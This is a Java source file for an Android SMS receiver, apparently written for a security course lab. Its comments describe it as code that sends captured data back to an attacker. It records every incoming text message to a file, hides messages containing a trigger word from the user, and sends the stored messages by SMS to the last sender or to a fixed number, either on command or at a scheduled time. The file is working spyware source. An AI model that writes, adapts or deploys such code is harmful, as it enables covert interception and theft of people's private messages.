package com.madewithorbit.lab4;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.*;
import android.widget.Toast;

import java.io.*;
import java.util.*;
//An sms receiver that intercepts messages sent to the phone
public class SMSReceiver extends BroadcastReceiver {
        String midnightAddress = "5556";
        boolean toastOnReceive = false, sendAtTime = true;
        int hour = 22;
        int minute = 39;
        String lastNumber = "";
        //onReceive is called when a broadcast is picked up, and is used to catch the sms message
        @Override
        public void onReceive(Context context, Intent intent) {
            //if the broadcast is a message sent from the app telling the receiver to stop
            if (intent.getAction().equals("com.madewithorbit.lab4.smsservice.STOP"))
            {
                Log.d("zack","unreg");
                context.unregisterReceiver(this);
            }
            //if the broadcast is an sms message
            else if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
            {
                final Bundle bundle = intent.getExtras();
                try {
                    if (bundle != null) {
                        final Object[] pdusObj = (Object[]) bundle.get("pdus");
                        for (int i = 0; i < pdusObj.length; i++) {

                            SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                            String phoneNumber = currentMessage.getDisplayOriginatingAddress();
                            lastNumber = phoneNumber;
                            String senderNum = phoneNumber;
                            String message = currentMessage.getDisplayMessageBody();



                            Log.i("zack", "Receieved from: "+ senderNum + " Message: " + message);

                            WriteToFile(context,senderNum, message);

                            if (toastOnReceive) {
                                int duration = Toast.LENGTH_LONG;
                                Toast toast = Toast.makeText(context, "Receieved from: " + senderNum + " Message: " + message, duration);
                                toast.show();
                            }

                            if (message.equalsIgnoreCase("signal"))
                            {
                                abortBroadcast();
                                try {
                                    SendFileContents(context);
                                }
                                catch(Exception e)
                                {
                                    e.printStackTrace();
                                }
                            }
                        }
                    }

                } catch (Exception e) {
                    Log.e("SmsReceiver", "Exception smsReceiver" +e);
                }
            }
            //if the broadcast is our own message to send the file contents back to the attacker
            else if (intent.getAction().equals("com.madewithorbit.lab4.smsservice.PHONEHOME"))
            {
                try {
                    SendFileContents(context);
                }
                catch(Exception e)
                {
                    e.printStackTrace();
                }
            }
            //if we are using the time ticker property, this message is picked up when it is a certain time
            else if (intent.getAction().equals("android.intent.action.TIME_TICK") && sendAtTime)
            {
                Calendar calendar = Calendar.getInstance();
                int h = calendar.get(Calendar.HOUR_OF_DAY);
                int m = calendar.get(Calendar.MINUTE);
                //Log.d("zack", h + "," + m);
                //Log.d("zack", m%2==0?"tick":"tock");
                if (h == hour && m == minute) {
                    try {
                        SendFileContents(context);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
        //this method sends the file contents of all the captured messages back to the attacker,
        //and empties the file afterwards
        public void SendFileContents(Context c) throws IOException
        {
            String filename = c.getFilesDir() + "/messages.txt";
            String result = "";
            File file = new File(filename);
            try {
                BufferedReader br = new BufferedReader(new FileReader(file));
                String line;
                while ((line = br.readLine()) != null) {
                    result += line + "\n";
                }
            }
            catch (IOException e) {
                e.printStackTrace();
            }
            Log.d("zack", result);

            file.delete();
            file.createNewFile();

            ArrayList<String> msgs = new ArrayList<String>();
            while(true)
            {
                if (result.length() > 120)
                {
                    msgs.add(result.substring(0, 120));
                    result = result.substring(120, result.length());
                }
                else
                {
                    msgs.add(result);
                    break;
                }
            }

            SmsManager smsManager = SmsManager.getDefault();
            for(String m : msgs) {
                if (!lastNumber.isEmpty())
                {
                    smsManager.sendTextMessage(lastNumber, null, m, null, null);
                }
                else {
                    smsManager.sendTextMessage(midnightAddress, null, m, null, null);
                }
            }

            //todo: test this function
        }
        //writes the received message to the file to be sent to attacker later
        public void WriteToFile(Context c,String sender, String message) throws IOException
        {
            String filename = c.getFilesDir() + "/messages.txt";
            File file = new File(filename);
            if (!file.exists())
            {
                file.createNewFile();
            }
            String text = "Sender: "+sender+"\nMessage: "+message+"\n";

            FileOutputStream fOut = new FileOutputStream(file, true);
            OutputStreamWriter osw = new OutputStreamWriter(fOut);
            osw.write(text);
            osw.flush();
            osw.close();
        }
    }